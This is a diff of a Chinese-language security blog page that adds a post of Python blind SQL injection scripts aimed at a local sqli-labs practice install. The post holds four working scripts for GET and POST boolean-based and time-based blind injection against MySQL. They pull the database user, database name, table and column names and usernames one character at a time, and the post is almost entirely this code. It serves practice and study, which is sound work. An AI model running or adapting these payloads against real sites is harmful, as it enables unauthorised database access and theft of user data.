@@ -15,7 +15,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Automne&#39;s Shadow</title>
+    <title>MySQL Blind Injection Scripts · Automne&#39;s Shadow</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -70,6 +70,8 @@
 
     <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
     <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -194,6 +196,8 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
@@ -201,27 +205,85 @@
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
     
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Automne&#39;s Shadow.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">MySQL Blind Injection Scripts</a>
+            </div>
+    </div>
+    
     <a class="home-link" href="/">Automne's Shadow.</a>
 </header>
     <div class="wrapper">
-        <div class="site-intro" style>
+        <div class="site-intro" style="height:50vh;">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            MySQL Blind Injection Scripts
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="sqli">sqli</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="mysql">mysql</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/03/21</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -322,43 +384,57 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/02/24/BSidesSF-CTF-2018-PassVault-WriteUp/">
-            
-                <span>BSidesSF CTF 2018 PasswordVault WriteUp</span>
-        </a>
-        <div class="abstract-content">
-            <p><strong>Android</strong><br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="reverse">reverse</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="fat">fat</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="git">git</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <p><strong>Web</strong><br><a id="more"></a></p>
+<p>以sqlilabs为例，分别给出mysql数据库的python盲注脚本。</p>
+<p>###GET型布尔盲注：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">payloads = string.letters + string.digits + <span class="string">"~!@#$%^&amp;*()_+"</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Start to retrive data:"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">40</span>):</span><br><span class="line">	<span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">		result = <span class="string">"1' and ascii(substring(user(),%s,1))= %s and '1' like '1"</span> % (i,ord(payload))</span><br><span class="line">		<span class="comment">#result = "1' and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),%s,1))= %s and '1' like '1" % (i,ord(payload))</span></span><br><span class="line">		<span class="comment">#result = "1' and ascii(substring((select group_concat(column_name) from information_schema.columns where table_name='users'),%s,1))= %s and '1' like '1" % (i,ord(payload))</span></span><br><span class="line">		<span class="comment">#result = "1' and ascii(substring((select group_concat(username) from users),%s,1))= %s and '1' like '1" % (i,ord(payload))</span></span><br><span class="line">		leo = requests.get(<span class="string">"http://192.168.126.146:8080/Less-8/?id=%s"</span> % result)</span><br><span class="line">		<span class="comment">#print leo.url</span></span><br><span class="line">		resp = leo.content</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"."</span>,</span><br><span class="line">		<span class="keyword">if</span> resp.count(<span class="string">"You are in"</span>) &gt; <span class="number">0</span>:</span><br><span class="line">			data += payload</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"\n\n[in progress]"</span>, data,</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n\n[Done]  output is %s"</span> % data</span><br></pre></td></tr></table></figure>
+<p>###GET型时间盲注：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">payloads = string.letters + string.digits + <span class="string">"~!@#$%^&amp;*()_+"</span></span><br><span class="line">data = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Start to retrive data:"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">	<span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			result = <span class="string">"1' and (select if(ascii(substr(database(),%s,1)) = %s,sleep(3),NULL)) and '1'='1"</span> % (i, ord(payload))</span><br><span class="line">			leo = requests.get(<span class="string">"http://192.168.126.146:8080/Less-9/?id=%s"</span> % result,timeout=<span class="number">1</span>)</span><br><span class="line">			<span class="comment">#print leo.url</span></span><br><span class="line">			<span class="keyword">print</span> <span class="string">"."</span>,</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			data += payload</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"\n\n[in progress]"</span>, data,</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n\n[Done]  output is %s"</span> % data</span><br></pre></td></tr></table></figure>
+<p>###POST型布尔盲注：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">payloads = string.letters + string.digits + <span class="string">"~!@#$%^&amp;*()_+"</span></span><br><span class="line"><span class="comment">#headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125;</span></span><br><span class="line">data = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Start to retrive data:"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">	<span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">		result = <span class="string">"1' or ascii(substring(user(),%s,1))= %s and '1' like '1"</span> % (i,ord(payload))</span><br><span class="line">		data0 = &#123;<span class="string">"passwd"</span>:<span class="string">"admin"</span>,<span class="string">"submit"</span>:<span class="string">"Submit"</span>,<span class="string">"uname"</span>:result&#125;</span><br><span class="line">		leo = requests.post(<span class="string">"http://192.168.126.146:8080/Less-15/index.php"</span>,data0)</span><br><span class="line">		resp = leo.content</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"."</span>,</span><br><span class="line">		<span class="keyword">if</span> resp.count(<span class="string">"slap"</span>) == <span class="number">0</span>:</span><br><span class="line">			data += payload</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"\n\n[in progress]"</span>, data,</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n\n[Done]  output is %s"</span> % data</span><br></pre></td></tr></table></figure>
+<p>###POST型时间盲注：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">payloads = string.letters + string.digits + <span class="string">"~!@#$%^&amp;*()_+"</span></span><br><span class="line"><span class="comment">#headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125;</span></span><br><span class="line">data = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Start to retrive data:"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">	<span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">		result = <span class="string">"123\") or (select if(ascii(substr(database(),%s,1))=%s,sleep(0.2),NULL))#"</span> % (i,ord(payload))</span><br><span class="line">		data0 = &#123;<span class="string">"passwd"</span>:<span class="string">"admin"</span>,<span class="string">"submit"</span>:<span class="string">"Submit"</span>,<span class="string">"uname"</span>:result&#125;</span><br><span class="line">		start = time.time()</span><br><span class="line">		<span class="comment">#print start</span></span><br><span class="line">		requests.post(<span class="string">"http://192.168.126.146:8080/Less-16/index.php"</span>,data0)</span><br><span class="line">		now = time.time()</span><br><span class="line">		<span class="comment">#print now</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"."</span>,</span><br><span class="line">		<span class="keyword">if</span> (now-start) &gt; <span class="number">0.1</span>:</span><br><span class="line">			data += payload</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"\n\n[in progress]"</span>, data,</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n\n[Done]  output is %s"</span> % data</span><br></pre></td></tr></table></figure>
     </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://ce-automne.github.io">Automne</a>
+            </p><p>原文链接: <a href="https://ce-automne.github.io/2019/03/21/MySQL-Blind-Injection-Scripts/">https://ce-automne.github.io/2019/03/21/MySQL-Blind-Injection-Scripts/</a>
+            </p><p>发表日期: <a href="https://ce-automne.github.io/2019/03/21/MySQL-Blind-Injection-Scripts/">March 21st 2019, 10:03:00 pm</a>
+            </p><p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a 2019 href="/2019/03/14/TAMU-CTF-2019-LocalNews-WriteUp/" title="TAMU" ctf localnews writeup>
+                    <div class="prevTitle">TAMU CTF 2019 LocalNews WriteUp</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -432,6 +508,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -804,6 +898,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
